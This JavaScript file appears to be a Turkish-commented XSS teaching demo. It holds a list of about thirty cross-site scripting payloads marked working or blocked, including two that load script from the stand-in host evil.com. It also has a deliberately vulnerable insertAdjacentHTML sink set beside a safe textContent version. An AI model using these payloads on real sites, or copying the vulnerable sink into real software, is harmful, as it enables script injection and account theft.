// hızlı seçim listesi 
// KURAL: works:true olanlar üstte, works:false olanlar en altta
const QUICK = [
  {
    name: "img onerror",
    code: '<img src=x onerror=alert(1)>',
    works: true
  },
  {
    name: "img/src/onerror (no space)",
    code: '<img/src/onerror=alert(1)>',
    works: true
  },
  {
    name: "img onerror template literal",
    code: '<img src=x onerror="alert`1`">',
    works: true
  },
  {
    name: "custom tag onmouseover",
    code: '<xss onmouseover=alert(1) style="padding:30px;background:#8e44ad;color:#fff;display:block">hover et</xss>',
    works: true
  },
  {
    name: "details ontoggle",
    code: '<details open ontoggle=alert(1)>',
    works: true
  },
  {
    name: "javascript: href",
    code: '<a href="javascript:alert(1)">tıkla</a>',
    works: true
  },
  {
    name: "video onerror",
    code: '<video src=x onerror=alert(1)>',
    works: true
  },
  {
    name: "audio onerror",
    code: '<audio src=x onerror=alert(1)>',
    works: true
  },
  {
    name: "input autofocus",
    code: '<input onfocus=alert(1) autofocus>',
    works: true,
    autofocus: true
  },
  {
    name: "select autofocus",
    code: '<select onfocus=alert(1) autofocus>',
    works: true,
    autofocus: true
  },
  {
    name: "textarea autofocus",
    code: '<textarea onfocus=alert(1) autofocus>',
    works: true,
    autofocus: true
  },
  {
    name: "onmouseover div",
    code: '<div onmouseover=alert(1) style="padding:20px;background:#c0392b;color:#fff">hover me</div>',
    works: true
  },
  {
    name: "attr escape + img",
    code: '"><img src=x onerror=alert(1)>',
    works: true
  },
  {
    name: "marquee onstart",
    code: '<marquee onstart=alert(1)>xss</marquee>',
    works: true
  },
  {
    name: "img mixed attr",
    code: '<img src=1 href=1 onerror="javascript:alert(1)">',
    works: true
  },

  // ÇALIŞMAYANLAR — EN ALTA
  {
    name: "svg onload",
    code: '<svg onload=alert(1)>',
    works: false
  },
  {
    name: "svg/onload (no space)",
    code: '<svg/onload=alert(1)>',
    works: false
  },
  {
    name: "script escape + svg",
    code: '</script><svg/onload=alert(1)>',
    works: false
  },
  {
    name: "svg animate onbegin",
    code: '<svg><animate onbegin=alert(1) attributeName=x>',
    works: false
  },
  {
    name: "attr escape + svg",
    code: '"><svg onload=alert(1)>',
    works: false
  },
  {
    name: "body onload",
    code: '<body onload=alert(1)>',
    works: false
  },
  {
    name: "iframe javascript:",
    code: '<iframe src=javascript:alert(1)>',
    works: false
  },
  {
    name: "formaction button",
    code: '<form><button formaction=javascript:alert(1)>click',
    works: false
  },
  {
    name: "object data",
    code: '<object data=javascript:alert(1)>',
    works: false
  },
  {
    name: "script tag",
    code: '<script>alert(1)</script>',
    works: false
  },
  {
    name: "script src",
    code: '<script src=//evil.com/x.js></script>',
    works: false
  },
  {
    name: "meta refresh javascript:",
    code: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    works: false
  },
  {
    name: "link import",
    code: '<link rel=import href=//evil.com/x.html>',
    works: false
  },
  {
    name: "base href javascript:",
    code: '<base href=javascript:>',
    works: false
  },
];

function renderQuickList() {
  let html = '';
  let dividerShown = false;

  QUICK.forEach((q, i) => {
    if (!q.works && !dividerShown) {
      dividerShown = true;
      html += `<div class="q-divider">Aşağıdaki payloadlar çalışmaz. HTML5 ve Chrome/Edge gibi modern tarayıcılar bu vektörleri kural gereği engeller.</div>`;
    }

    html += `
    <div class="q-item${q.works ? '' : ' blocked'}" ${q.works ? `onclick="pickQuick(${i})"` : ''}>
      <div class="q-name">
        ${q.name}
        <span class="q-tag${q.works ? '' : ' no'}">${q.works ? '✓ çalışır' : '✕ engelli'}</span>
      </div>
      <div class="q-code">${q.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
    </div>`;
  });

  document.getElementById('quick-list').innerHTML = html;
}

function pickQuick(i) {
  const q = QUICK[i];
  document.getElementById('custom-payload').value = q.code;
  applyToBar(q.code, q);
}

document.getElementById('apply-btn').addEventListener('click', () => {
  const val = document.getElementById('custom-payload').value.trim();
  if (!val) return;
  applyToBar(val, null);
});

function applyToBar(code, q) {
  document.getElementById('bad-input').value = code;
  document.getElementById('good-input').value = code;
  document.getElementById('bad-result').innerHTML = '<span class="result-dash">—</span>';
  document.getElementById('good-result').textContent = '—';

  const note = document.getElementById('risk-note');

  if (q && q.autofocus) {
    note.innerHTML = `[!] <b>autofocus payload</b> — "ara"ya basınca alert spam oluşabilir. Sayfayı yenilemek için <b>F5</b> kullanın.`;
    note.classList.add('show');
  } else {
    note.classList.remove('show');
  }
}

function runBad() {
  const val = document.getElementById('bad-input').value;
  const out = document.getElementById('bad-result');

  if (!val.trim()) {
    out.innerHTML = '<span class="result-dash">—</span>';
    return;
  }

  out.classList.remove('result-active');
  out.classList.add('result-active');
  out.textContent = 'Aranan: ';
  out.insertAdjacentHTML('beforeend', val); // açık — payload kasıtlı olarak çalıştırılır
}

function runGood() {
  const val = document.getElementById('good-input').value;
  const out = document.getElementById('good-result');

  if (!val.trim()) {
    out.textContent = '—';
    return;
  }

  out.classList.remove('result-active');
  out.classList.add('result-active');
  out.textContent = 'Aranan: ' + val; // güvenli — HTML hiçbir zaman işlenmez
}

document.getElementById('bad-run').addEventListener('click', runBad);
document.getElementById('good-run').addEventListener('click', runGood);

renderQuickList();